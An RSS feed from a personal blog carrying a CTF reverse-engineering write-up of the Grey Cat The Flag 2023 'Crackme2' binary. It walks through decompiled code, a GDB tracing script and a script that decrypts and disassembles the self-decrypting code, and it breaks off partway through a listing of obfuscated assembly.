<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on # matth.dmz42.org</title>
		<link>https://matth.dmz42.org/posts/</link>
		<description>Recent content in Posts on # matth.dmz42.org</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Wed, 24 May 2023 08:54:33 +0200</lastBuildDate>
		<atom:link href="https://matth.dmz42.org/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Grey Cat the Flag CTF 2023 - Crackme2</title>
			<link>https://matth.dmz42.org/posts/2023/grey-cat-the-flag-2023-crackme2/</link>
			<pubDate>Wed, 24 May 2023 08:54:33 +0200</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2023/grey-cat-the-flag-2023-crackme2/</guid>
			<description>Grey Cat The Flag CTF 2023 had some nice reversing challenges, this one was very nice and i think deserves a small writeup.
You can grab the original file here. A fixed version was later released fixed, but i used the original binary.
1. Quick Recon it&amp;rsquo;s a 64 bits ELF that takes the flag as input
% file crackme2 crackme2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.</description>
			<content type="html"><![CDATA[<p>Grey Cat The Flag CTF 2023 had some nice reversing challenges, this one was very nice and i think deserves a small writeup.</p>
<p>You can grab the original file <a href="crackme2">here</a>. A fixed version was later released <a href="crackme2-new">fixed</a>, but i used the original binary.</p>
<h1 id="1-quick-recon">1. Quick Recon</h1>
<p>it&rsquo;s a 64 bits ELF that takes the flag as input</p>
<pre tabindex="0"><code>% file crackme2
crackme2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef9a4ed8207e6b5b4ff62a6c5e140a5059d6d067, for GNU/Linux 3.2.0, stripped

% ./crackme2
Usage: ./crackme2 [greyctf{...}]
</code></pre><p>also we can notice there&rsquo;s some antidebug as it&rsquo;s attempting to ptrace itself, so we&rsquo;ll probably have to deal with it</p>
<pre tabindex="0"><code>% strace -e trace=ptrace ./crackme2 bla
ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=NULL} ---
+++ killed by SIGSEGV +++
zsh: segmentation fault  strace -e trace=ptrace ./crackme2 bla
</code></pre><p>the segfault is due to the original binary being slightly broken but is not an issue.</p>
<p><code>main</code> is nothing fancy but we can notice the input flag is copied to the stack:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span> <span class="p">[</span><span class="mi">136</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s [greyctf{...}]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">*</span><span class="n">argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mh">0x7f</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;The flag isn</span><span class="se">\&#39;</span><span class="s">t so long. You will overflow the program...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* copy input flag on the stack */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* meat must be here */</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">FUN_004014c3</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>everything must happen during the call to <code>FUN_004014c3</code> however it&rsquo;s a very long chain of function calls (lot of FUN&hellip;. :p):</p>
<p><img src="01.png" alt="function calls"></p>
<p>so we can work backward instead: find an interesting string like <code>&quot;Wrong flag :(&quot;</code> and walk the XREF up to <code>00401350</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">execute_mess</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">__addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">__addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">syscall_mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">__addr</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wrong_flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">dyn_call</span><span class="p">(</span><span class="n">__addr</span><span class="p">,</span><span class="mh">0x38c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">munmap</span><span class="p">(</span><span class="n">__addr</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wrong_flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h1 id="2-understanding-whats-happening">2. Understanding what&rsquo;s happening</h1>
<p>it starts by allocating a RWX region using <code>mmap</code>. It&rsquo;s not using the library function, but the syscall instead:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">                             <span class="nf">syscall_mmap</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401232</span> <span class="nf">f3</span> <span class="mi">0</span><span class="no">f</span> <span class="mi">1</span><span class="no">e</span> <span class="no">fa</span>                  <span class="no">ENDBR64</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401236</span> <span class="err">55</span>                           <span class="nf">PUSH</span>                    <span class="no">RBP</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401237</span> <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                     <span class="no">MOV</span>                     <span class="no">RBP</span><span class="p">,</span><span class="no">RSP</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040123</span><span class="nf">a</span> <span class="mi">48</span> <span class="mi">89</span> <span class="mi">7</span><span class="no">d</span> <span class="no">e8</span>                  <span class="no">MOV</span>                     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_20</span><span class="p">],</span><span class="no">RDI</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040123</span><span class="nf">e</span> <span class="mi">48</span> <span class="mi">89</span> <span class="mi">75</span> <span class="no">e0</span>                  <span class="no">MOV</span>                     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_28</span><span class="p">],</span><span class="no">RSI</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401242</span> <span class="err">89</span> <span class="err">55</span> <span class="nf">dc</span>                     <span class="no">MOV</span>                     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_2c</span><span class="p">],</span><span class="no">EDX</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401245</span> <span class="err">89</span> <span class="err">4</span><span class="nf">d</span> <span class="no">d8</span>                     <span class="no">MOV</span>                     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_30</span><span class="p">],</span><span class="no">ECX</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401248</span> <span class="err">44</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">d4</span>                  <span class="no">MOV</span>                     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_34</span><span class="p">],</span><span class="no">R8D</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040124</span><span class="nf">c</span> <span class="mi">4</span><span class="no">c</span> <span class="mi">89</span> <span class="mi">4</span><span class="no">d</span> <span class="no">c8</span>                  <span class="no">MOV</span>                     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_40</span><span class="p">],</span><span class="no">R9</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401250</span> <span class="err">49</span> <span class="err">89</span> <span class="nf">ca</span>                     <span class="no">MOV</span>                     <span class="no">R10</span><span class="p">,</span><span class="no">RCX</span>
</span></span><span class="line"><span class="cl">                                       <span class="c1">; 0x9 is syscall for mmap (https://filippo.io/linux-syscall-table/)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">00401253</span> <span class="err">48</span> <span class="nf">c7</span> <span class="no">c0</span> <span class="mi">09</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>         <span class="no">MOV</span>                     <span class="no">RAX</span><span class="p">,</span><span class="mi">0x9</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040125</span><span class="nf">a</span> <span class="mi">0</span><span class="no">f</span> <span class="mi">05</span>                        <span class="no">SYSCALL</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040125</span><span class="nf">c</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">c1</span>                     <span class="no">MOV</span>                     <span class="no">RCX</span><span class="p">,</span><span class="no">RAX</span>
</span></span><span class="line"><span class="cl">        <span class="err">0040125</span><span class="nf">f</span> <span class="mi">48</span> <span class="mi">89</span> <span class="mi">4</span><span class="no">d</span> <span class="no">f8</span>                  <span class="no">MOV</span>                     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_10</span><span class="p">],</span><span class="no">RCX</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401263</span> <span class="err">48</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">f8</span>                  <span class="no">MOV</span>                     <span class="no">RAX</span><span class="p">,</span><span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">RBP</span> <span class="err">+</span> <span class="no">local_10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401267</span> <span class="err">5</span><span class="nf">d</span>                           <span class="no">POP</span>                     <span class="no">RBP</span>
</span></span><span class="line"><span class="cl">        <span class="err">00401268</span> <span class="nf">c3</span>                           <span class="no">RET</span>
</span></span></code></pre></div><p>then it loops over and over decrypting and executing some code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dyn_call</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="n">mmap_mem</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mh">0xad23773b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">decrypt_code</span><span class="p">(</span><span class="n">mmap_mem</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">index</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* actually returns both index and key for next round */</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">mmap_mem</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt_code</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">table</span><span class="p">,</span><span class="n">uint</span> <span class="n">key</span><span class="p">,</span><span class="kt">int</span> <span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ulong</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="n">ENCRYPTED_CODE</span><span class="p">[</span><span class="n">offset</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">dword</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">table</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">ENCRYPTED_CODE</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>decrypt_code</code> takes a XOR key and offset into an array we call <code>ENCRYPTED_CODE</code> and decrypt+copy into the mmap&rsquo;ed region.</p>
<p>We can use a small GDB script to trace calls to <code>decrypt_code</code> and dump xor keys and offsets:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdb</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_reg</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">parse_and_eval</span><span class="p">(</span><span class="s2">&#34;$</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">reg</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;trace_crack2.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;break *0x40133b&#39;</span><span class="p">)</span>  <span class="c1"># call decrypt_code</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">read_reg</span><span class="p">(</span><span class="s1">&#39;esi&#39;</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">read_reg</span><span class="p">(</span><span class="s1">&#39;edx&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;key 0x</span><span class="si">%x</span><span class="s2"> idx 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;key 0x</span><span class="si">%x</span><span class="s2"> idx 0x</span><span class="si">%x</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;continue&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>which produces a trace like that:</p>
<pre tabindex="0"><code>key 0xad23773b idx 0x38c
key 0x92d26427 idx 0x3c3
key 0x1411f6c3 idx 0x3ff
key 0x69cbae50 idx 0x446
key 0x7332a93 idx 0x477
key 0x93efb281 idx 0x4ad
key 0xe23f1d80 idx 0x4e6
key 0xceb1956e idx 0x517
key 0xab7f0423 idx 0x54a
key 0x565118bb idx 0x57f
key 0xd99d45a idx 0x5b7
key 0x5601610d idx 0x5ef
key 0xb38a2126 idx 0x62a
key 0x1cf5510b idx 0x670
key 0x83125f0c idx 0x6a0
key 0xd48c0a3a idx 0x6d9
key 0xe89cc9cd idx 0x4
</code></pre><p>which can be used by this script to decrypt and disassemble the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">capstone</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># encrypted code region</span>
</span></span><span class="line"><span class="cl"><span class="n">CODE_OFFSET</span> <span class="o">=</span> <span class="mh">0xc0a0</span>
</span></span><span class="line"><span class="cl"><span class="n">CODE_SIZE</span>   <span class="o">=</span> <span class="mh">0x10000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span><span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x</span><span class="si">%x</span><span class="s2">:</span><span class="se">\t</span><span class="si">%s</span><span class="se">\t</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">mnemonic</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">op_str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">sz</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">sz</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>   <span class="c1"># read size</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">[(</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">:(</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="n">size</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># read encrypted code from binary</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">CODE_OFFSET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">CODE_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;trace_crack2.txt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;bloc: 0x</span><span class="si">%x</span><span class="s2">   0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
</span></span></code></pre></div><p>the decrypted code clearly looks obfuscated:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">bloc:</span> <span class="err">0</span><span class="nf">x38c</span>   <span class="mi">0xad23773b</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0:</span>    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x3689bc0d</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7:</span>    <span class="nf">movabs</span>  <span class="no">rdi</span><span class="p">,</span> <span class="mi">0x864e55d5</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x11:</span>   <span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x14:</span>   <span class="nf">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x1471e32d</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x1b:</span>   <span class="nf">sub</span> <span class="no">rbx</span><span class="p">,</span> <span class="no">rdi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x1e:</span>   <span class="nf">movabs</span>  <span class="no">r10</span><span class="p">,</span> <span class="mi">0xe9d3019e</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x28:</span>   <span class="nf">sub</span> <span class="no">r10</span><span class="p">,</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x2b:</span>   <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x9f3a96e</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x32:</span>   <span class="nf">sub</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">r10</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x35:</span>   <span class="nf">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x5bcaf507</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x3c:</span>   <span class="nf">xor</span> <span class="no">rbx</span><span class="p">,</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x3f:</span>   <span class="nf">movabs</span>  <span class="no">r10</span><span class="p">,</span> <span class="mi">0xafdf5a79</span>
